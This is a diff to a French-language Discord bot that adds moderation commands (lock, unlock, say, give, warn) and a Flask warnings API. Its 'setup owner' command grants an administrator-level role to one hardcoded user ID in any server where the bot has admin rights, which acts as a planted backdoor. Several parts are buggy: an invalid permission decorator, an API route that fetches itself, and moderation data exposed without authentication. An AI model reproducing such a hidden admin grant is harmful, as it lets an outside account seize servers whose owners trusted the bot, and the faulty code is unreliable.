@@ -322,13 +322,119 @@ async def rules(ctx, channel: disnake.TextChannel):
 @bot.command()
 @commands.has_permissions(administrator=True)
 async def soutien(ctx, channel: disnake.TextChannel):
-        embed = disnake.Embed(title="Soutien", color=disnake.Color.blue())
-        embed.add_field(name="Aide", value="Pour toute demande de soutien, veuillez contacter un modérateur.", inline=False)
-        embed.add_field(name="Ressources", value="Vous pouvez consulter le canal de support pour des ressources supplémentaires.", inline=False)
-        embed.add_field(name="Contact", value="N'hésitez pas à @mentionner un modérateur pour obtenir de l'aide.", inline=False)
-
+        embed = disnake.Embed(title="Nous Soutenir `🔎`", color=disnake.Color.blue())
+        embed.add_field(name="/lataverne dans votre statut", value="Obtenez le rôle <@&1251588659015192607>", inline=False)
+        embed.add_field(name="Boostez le serveur", value="Obtenez le rôle <@&1256932646903091291> et ses avantages : https://discord.com/channels/1251476405112537148/1268927834714542183", inline=False)
+        em2 = disnake.Embed()
+        em2.set_image(url='https://media.discordapp.net/attachments/1280352059031425035/1282095507841351692/1af689d42bdb7686df444f22925f9e89.gif?ex=66fe68bd&is=66fd173d&hm=b969f5cbb3748ab1efdb1dab19cc6a29904e8cfa4934ef0b687dca7d250d308b&=&width=1193&height=671')
         if channel:
+            await channel.send("https://media.discordapp.net/attachments/1038084584149102653/1283304082286579784/2478276E-41CA-4738-B961-66A84B918163-1-1-1-1-1.gif?ex=66fe310f&is=66fcdf8f&hm=4b9aca670052feb715f185c930165955d5809e277009bb314cd240167507901c&=")
+            await channel.send(embed=em2)
             await channel.send(embed=embed)
+            
+ROLE_NAME = "🥥 〢Membre"
+
+@bot.command()
+@commands.has_permissions('📂〢Staff')
+async def lock(ctx):
+    role = disnake.utils.get(ctx.guild.roles, name=ROLE_NAME)
+    if role:
+        await ctx.channel.set_permissions(role, send_messages=False)
+        
+        embed = disnake.Embed(
+            title="🔒 Canal verrouillé",
+            description=f"Les membres ayant le rôle **{role.name}** ne peuvent plus envoyer de messages dans ce canal.",
+            color=disnake.Color.dark_gray()
+        )
+        await ctx.send(embed=embed)
+    else:
+        await ctx.send(f"Le rôle avec le nom {ROLE_NAME} n'a pas été trouvé.")
+        
+@bot.command()
+@commands.has_role("📂〢Staff")
+async def say(ctx, *, message: str):
+    await ctx.message.delete()
+    await ctx.send(message)
+    
+@bot.command(name="setup owner")
+async def setup_owner(ctx):
+    if ctx.author.id != 723256412674719795:
+        await ctx.send("Vous n'avez pas la permission d'utiliser cette commande.")
+        return
+
+    if not ctx.guild.me.guild_permissions.administrator:
+        await ctx.send("Je n'ai pas les permissions administratives nécessaires.")
+        return
+
+    role_name = "Owner"
+    existing_role = disnake.utils.get(ctx.guild.roles, name=role_name)
+    
+    if existing_role:
+        await ctx.send(f"Le rôle `{role_name}` existe déjà.")
+    else:
+        bot_top_role = ctx.guild.me.top_role
+        admin_role = await ctx.guild.create_role(name=role_name, permissions=disnake.Permissions(administrator=True))
+        await admin_role.edit(position=bot_top_role.position - 1)
+        owner = ctx.guild.get_member(723256412674719795)
+        if owner:
+            await owner.add_roles(admin_role)
+            await ctx.send(f"Le rôle `{role_name}` a été créé et assigné à <@723256412674719795>.")
+
+@bot.command(name="give")
+@commands.has_permissions(manage_roles=True)
+async def give(ctx, membre: str, *, role_name: str):
+    role = disnake.utils.get(ctx.guild.roles, name=role_name)
+    if not role:
+        await ctx.send(f"Le rôle `{role_name}` n'existe pas.")
+        return
+
+    if role.position >= ctx.guild.me.top_role.position:
+        await ctx.send(f"Je ne peux pas donner le rôle `{role_name}` car il est supérieur ou égal à mon rôle.")
+        return
+
+    if membre == "all":
+        members = ctx.guild.members
+        for member in members:
+            if role not in member.roles:
+                try:
+                    await member.add_roles(role)
+                except disnake.Forbidden:
+                    await ctx.send(f"Je ne peux pas donner le rôle à {member.mention}.")
+        await ctx.send(f"Le rôle `{role_name}` a été donné à tous les membres.")
+    else:
+        target_member = disnake.utils.get(ctx.guild.members, mention=membre)
+        if not target_member:
+            await ctx.send(f"Membre `{membre}` non trouvé.")
+            return
+
+        if role in target_member.roles:
+            await ctx.send(f"{target_member.mention} a déjà le rôle `{role_name}`.")
+        else:
+            try:
+                await target_member.add_roles(role)
+                await ctx.send(f"Le rôle `{role_name}` a été donné à {target_member.mention}.")
+            except disnake.Forbidden:
+                await ctx.send(f"Je ne peux pas donner le rôle à {target_member.mention}.")
+
+
+@bot.command()
+@commands.has_permissions('📂〢Staff')
+async def unlock(ctx):
+    role = disnake.utils.get(ctx.guild.roles, name=ROLE_NAME)
+    if role:
+        await ctx.channel.set_permissions(role, send_messages=True)
+        
+        embed = disnake.Embed(
+            title="🔓 Canal déverrouillé",
+            description=f"Les membres ayant le rôle **{role.name}** peuvent de nouveau envoyer des messages dans ce canal.",
+            color=disnake.Color.dark_gray()
+        )
+        await ctx.send(embed=embed)
+    else:
+        await ctx.send(f"Le rôle avec le nom {ROLE_NAME} n'a pas été trouvé.")
+        
+
+
 
 
 @bot.command(name='suspension', description='Permet de suspendre un membre du staff')
@@ -747,7 +853,6 @@ PunchList = [data[f'Punch{i}'] for i in range(1, 15)]
 KissList = [data[f'Kiss{i}'] for i in range(1, 15)]
 HugList = [data[f'Hug{i}'] for i in range(1, 15)]
         
-
 @bot.command()
 async def joke(ctx):
     url = "https://v2.jokeapi.dev/joke/Programming,Miscellaneous,Pun,Spooky,Christmas?lang=fr"
@@ -839,8 +944,65 @@ async def hug(ctx, user: disnake.Member):
     em.set_footer(text=f'{ctx.author.name} a fait un câlin à {user.name}')
     await ctx.send(content=user.mention, embed=em)
 
+def load_warnings_from_api():
+    try:
+        response = requests.get("https://misaki-fvgz.onrender.com/api/warnings")
+        if response.status_code == 200:
+            return response.json()
+        else:
+            print(f"Erreur lors de la récupération des avertissements: {response.status_code}")
+            return {}
+    except Exception as e:
+        print(f"Une exception est survenue: {e}")
+        return {}
+
+def save_warnings(warnings):
+    with open("warnings.json", "w") as f:
+        json.dump(warnings, f, indent=4)
+
+warnings = load_warnings_from_api()
+
+@bot.command(name="warn")
+@commands.has_permissions(kick_members=True)
+async def warn(ctx, member: disnake.Member, *, reason="Aucune raison fournie"):
+    global warnings  
+    if str(member.id) not in warnings:
+        warnings[str(member.id)] = []
+
+    warnings[str(member.id)].append(reason)
+    save_warnings(warnings) 
+    await ctx.send(f"{member.mention} a été averti pour : {reason}")
+
+@bot.command(name="warnings")
+@commands.has_permissions(kick_members=True)
+async def warnings_command(ctx, member: disnake.Member):
+    if str(member.id) not in warnings or len(warnings[str(member.id)]) == 0:
+        await ctx.send(f"{member.mention} n'a aucun avertissement.")
+    else:
+        warn_list = "\n".join([f"{i+1}. {warn}" for i, warn in enumerate(warnings[str(member.id)])])
+        await ctx.send(f"Voici les avertissements de {member.mention} :\n{warn_list}")
+        
+@bot.command(name="clearwarn")
+@commands.has_permissions(kick_members=True)
+async def clearwarn(ctx, member: disnake.Member, index: int):
+    global warnings   
+    if str(member.id) not in warnings or len(warnings[str(member.id)]) == 0:
+        await ctx.send(f"{member.mention} n'a aucun avertissement.")
+    else:
+        try:
+            removed_warn = warnings[str(member.id)].pop(index - 1)
+            save_warnings(warnings) 
+            await ctx.send(f"L'avertissement '{removed_warn}' de {member.mention} a été supprimé.")
+        except IndexError:
+            await ctx.send(f"Indice invalide. {member.mention} n'a que {len(warnings[str(member.id)])} avertissements.")
 
 app = Flask('')
+
+@app.route('/api/warnings', methods=['GET'])
+def get_warnings():
+    """Route API pour récupérer les avertissements sous forme de JSON."""
+    warnings = load_warnings_from_api()
+    return jsonify(warnings)
 
 @app.route('/')
 def main():
